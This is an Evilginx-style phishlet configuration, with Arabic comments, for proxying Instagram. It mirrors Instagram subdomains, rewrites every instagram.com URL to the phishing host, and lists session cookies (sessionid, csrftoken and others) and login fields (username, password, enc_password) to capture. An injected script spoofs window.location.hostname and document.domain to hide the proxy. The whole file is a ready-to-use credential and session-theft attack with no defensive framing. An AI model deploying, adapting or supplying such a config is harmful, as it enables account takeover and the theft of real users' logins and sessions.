name: 'Instagram Enhanced'
target_domain: 'www.instagram.com'
proxy_hosts:
  - { phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com' }
  - { phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com' }
  - { phish_sub: 'help', orig_sub: 'help', domain: 'instagram.com' }
  - { phish_sub: 'about', orig_sub: 'about', domain: 'instagram.com' }
  - { phish_sub: 'blog', orig_sub: 'blog', domain: 'instagram.com' }
  - { phish_sub: 'static', orig_sub: 'static', domain: 'cdninstagram.com' } # إضافة نطاقات CDN

sub_filters:
  # مرشحات قوية لاستبدال جميع أشكال النطاق في جميع أنواع المحتوى
  - hostname: '{hostname}'
    sub: 'www'
    domain: 'instagram.com'
    search: '(?:https?:)?(?:\/\/)?(?:[a-zA-Z0-9.-]+\.)*instagram\.com'
    replace: 'https://{hostname}'
    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain', 'image/svg+xml']

auth_tokens:
  # قائمة موسعة من Evilginx3-Phishlets
  - 'sessionid'
  - 'ds_user_id'
  - 'csrftoken'
  - 'rur'
  - 'mid'
  - 'ig_did'
  - 'datr'
  - 'shbid'
  - 'shbts'
  - 'fbm_'
  - 'wd'
  - 'rur'

creds_fields:
  # قائمة موسعة
  - 'username'
  - 'password'
  - 'emailOrPhone'
  - 'enc_password'
  - 'encrypted_password'

auth_urls:
  - 'https://www.instagram.com/accounts/onetap/?next=%2F'
  - 'https://www.instagram.com/direct/inbox/'
  - 'https://www.instagram.com/'

js_inject: |
  // حقن JavaScript متقدم
  (function() {
      // منع اكتشاف البروكسي عبر window.location
      Object.defineProperty(window.location, 'hostname', { get: function() { return 'www.instagram.com'; } });
      Object.defineProperty(document, 'domain', { get: function() { return 'instagram.com'; } });

      // إصلاح الروابط التي تحتوي على //
      var links = document.querySelectorAll('a[href^="//"]');
      for (var i = 0; i < links.length; i++) {
          links[i].href = 'https://' + window.location.hostname + links[i].href.substring(2);
      }

      console.log('Phishlet Enhanced loaded.');
  })();
